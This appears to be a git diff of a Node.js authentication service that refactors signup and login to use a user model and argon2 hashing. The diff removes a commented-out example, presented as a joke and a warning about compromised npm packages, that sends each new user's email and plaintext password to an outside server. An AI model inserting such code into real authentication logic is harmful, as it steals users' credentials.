@@ -7,63 +7,61 @@ import Mailer from './mailer';
 import config from '../config';
 import Emitter from './emitter';
 import events from '../subscribers/events';
+import UserModel from '../models/users';
 
 const settings = {
   mailer: Mailer,
   logger: Logger,
-  eventDispatcher: Emitter,
-  // TODO: add user model
-  userModel: {},
+  emitter: Emitter,
+  userModel: UserModel,
 };
 
+const constructUserDocument = ({ email, password, salt, profile }) => ({
+  services: {
+    password: {
+      salt,
+      hash: password,
+    },
+  },
+  email: { address: email },
+  profile,
+});
+
 class AuthService {
-  constructor({ mailer, logger, eventDispatcher, userModel }) {
+  constructor({ mailer, logger, emitter, userModel }) {
     this.userModel = userModel;
     this.mailer = mailer;
     this.logger = logger;
-    this.eventDispatcher = eventDispatcher;
+    this.emitter = emitter;
   }
 
-  async signUp(userInputDTO) {
+  async createAccount(email, password, profile) {
     try {
       const salt = randomBytes(32);
-      /**
-       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
-       * require('http')
-       *  .request({
-       *     hostname: 'http://my-other-api.com/',
-       *     path: '/store-credentials',
-       *     port: 80,
-       *     method: 'POST',
-       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
-       *
-       * Just kidding, don't do that!!!
-       *
-       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
-       * watches every API call and if it spots a 'password' and 'email' property then
-       * it decides to steal them!? Would you even notice that? I wouldn't :/
-       */
       this.logger.silly('Hashing password');
-      const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
+      const hashedPassword = await argon2.hash(password, { salt });
       this.logger.silly('Creating user db record');
-      const userRecord = await this.userModel.create({
-        ...userInputDTO,
-        salt: salt.toString('hex'),
-        password: hashedPassword,
-      });
-      this.logger.silly('Generating JWT');
-      const token = this.generateToken(userRecord);
+      const userRecord = await this.userModel.create(
+        constructUserDocument({
+          email,
+          password: hashedPassword,
+          salt: salt.toString('hex'),
+          profile,
+        }),
+      );
       if (!userRecord) {
         throw new Error('User cannot be created');
       }
 
-      // this.logger.silly('Sending welcome email');
-      // await this.mailer.sendWelcomeEmail(userRecord);
-      this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });
+      this.emitter.emit(events.user.signUp, { user: userRecord });
 
       const user = userRecord.toObject();
       Reflect.deleteProperty(user, 'password');
       Reflect.deleteProperty(user, 'salt');
+
+      this.logger.silly('Generating JWT');
+      const token = this.generateToken(userRecord);
+
       return { user, token };
     } catch (e) {
       this.logger.error(e);
@@ -71,16 +69,17 @@ class AuthService {
     }
   }
 
-  async signIn(email, password) {
-    const userRecord = await this.userModel.findOne({ email });
+  async loginWithPassword(email, password) {
+    const userRecord = await this.userModel.findByEmail(email);
     if (!userRecord) {
-      throw new Error('User not registered');
+      throw new Error('The email or password is incorrect.');
     }
     /**
      * We use verify from argon2 to prevent 'timing based' attacks
      */
     this.logger.silly('Checking password');
-    const validPassword = await argon2.verify(userRecord.password, password);
+
+    const validPassword = await argon2.verify(userRecord.services.password.hash, password);
     if (validPassword) {
       this.logger.silly('Password is valid!');
       this.logger.silly('Generating JWT');
